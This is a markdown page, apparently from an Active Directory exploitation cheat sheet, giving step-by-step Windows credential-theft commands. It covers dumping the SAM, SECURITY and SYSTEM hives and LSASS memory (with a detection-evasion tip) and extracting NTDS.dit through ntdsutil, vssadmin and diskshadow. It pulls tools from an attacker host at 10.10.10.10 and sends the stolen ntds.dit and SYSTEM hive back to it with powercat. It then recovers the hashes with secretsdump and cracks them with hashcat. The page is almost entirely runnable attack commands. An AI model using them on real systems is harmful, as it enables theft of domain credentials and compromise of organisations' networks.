## Account hunting & data exfiltration

### SAM / SECURITY / SYSTEM
```powershell
reg.exe save hklm\sam C:\path\SAM
reg.exe save hklm\security C:\path\SECURITY
reg.exe save hklm\system C:\path\SYSTEM
# REBUILD
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

### LSASS MEMORY DUMPING
```powershell
# NORMAL
.\procdump.exe -accepteula -ma lsass lsass.dmp
# STRING EVASION, REPLACE WITH PID
.\procdump.exe -accepteula -ma process_PID lsass.dmp
# REBUILD
pypykatz lsa minidump lsass.dmp 
```

### Obtaining NTDS.dit Using ntdsutil
```cmd
ntdsutil
activate instance ntds
ifm
create full C:\ntdsutil
quit
quit
```

### Obtaining NTDS.dit Using vssadmin
```cmd
mkdir c:\extract
REM -> c:\Windows\system32
vssadmin create shadow /for=c:
copy \\?GLOBALROOT\Device\HarddiskVolumeShadowCopy5\Windows\ntds\ntds.dit c:\extract\ntds.dit
reg SAVE HKLM\SYSTEM c:\extract\SYS
REM yes
REM exfiltrate to your attacker computer
REM housekeeping
vssadmin delete shadows /shadow={PATH} /Quiet
```

### Obtaining NTDS.dit Using shadow copy (SeBackup)
```powershell
# Create  script.txt file that will contain the shadow copy process script
#Script ->{
set context persistent nowriters  
set metadata c:\windows\system32\spool\drivers\color\example.cab  
set verbose on  
begin backup  
add volume c: alias mydrive  

create  

expose %mydrive% w:  
end backup  
#}

# TRANSFERT TO TARGET SYSTEM
Invoke-WebRequest -Uri "http://10.10.10.10/script.txt" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\script.txt"

# EXEC DISKSHADOW
cd C:\windows\system32\spool\drivers\color
diskshadow.exe -s script.txt

# CHECK THE CAB
ls
-a----         6/7/2020   9:31 PM            743 example.cab

# IMPORTING DLL SeBackupPrivilegeCmdLets & SeBackupPrivilegeUtils
Invoke-WebRequest -Uri "http://10.10.10.10/SeBackupPrivilegeCmdLets.dll" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeCmdLets.dll"
Invoke-WebRequest -Uri "http://10.10.10.10/SeBackupPrivilegeUtils.dll" -OutFile "C:\\windows\\system32\\spool\\drivers\\color\\SeBackupPrivilegeUtils.dll"
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll

# CHECK MODULE
get-help SeBackupPrivilege
Name                              Category  Module                    Synopsis
----                              --------  ------                    --------
Get-SeBackupPrivilege             Cmdlet    SeBackupPrivilegeCmdLets  ...
Set-SeBackupPrivilege             Cmdlet    SeBackupPrivilegeCmdLets  ...
Copy-FileSeBackupPrivilege        Cmdlet    SeBackupPrivilegeCmdLets  ...

#Use the functionality of the dlls to copy the ntds.dit database file from the shadow copy to a location of our choice
Copy-FileSeBackupPrivilege w:\windows\NTDS\ntds.dit c:\Windows\temp\ntds.dit -Overwrite

# Dump ACTUAL SYSTEM hive
reg.exe save HKLM\SYSTEM c:\temp\system.hive 

# FILE TRANSFERT
powercat -c 10.10.10.10 -p 443 -i c:\Windows\temp\system.hive
powercat -c 10.10.10.10 -p 443 -i c:\Windows\temp\ntds.dit
```

---
### Rebuild AD Hashes
- -ntds: location and name of the ntds.dit file
- -system: location and name of the SYSTEM hive
- -hashes lmnhash:nthash: NTLM hash
- LOCAL: parse files on the local system
- -outputfile: location and name of the output file. Extensions are automatically added based on content extracted
```bash
# impacket
secretsdump.py -ntds ntds.dit -system SYS -hashes lmhash:nthash LOCAL -outputfile ntlm-extract
```

---
### Install your NVIDIA Driver for GPU Power
```bash
apt install -y nvidia-driver nvidia-cuda-toolkit
apt install -y mesa-utils
# CHECK
nvidia-smi
# CHECK
nvidia-smi -i 0 -q
# CHECK
glxinfo | grep -i "direct rendering"
```

---
### Cracking
- -m 1000: NTLM | Operating Systems
- ntlm-extract.ntds: secretsdump outfile
- /usr/share/wordlists/rockyou.txt: plaintext wordlist
- -o: location of cracked hash
```bash
hashcat -m 1000 ntlm-extract.ntds /usr/share/wordlists/rockyou.txt -o cracked
cat cracked 
```

[<- BACK TO MAIN MENU ->](https://github.com/Integration-IT/Active-Directory-Exploitation-Cheat-Sheet/blob/master/README.md)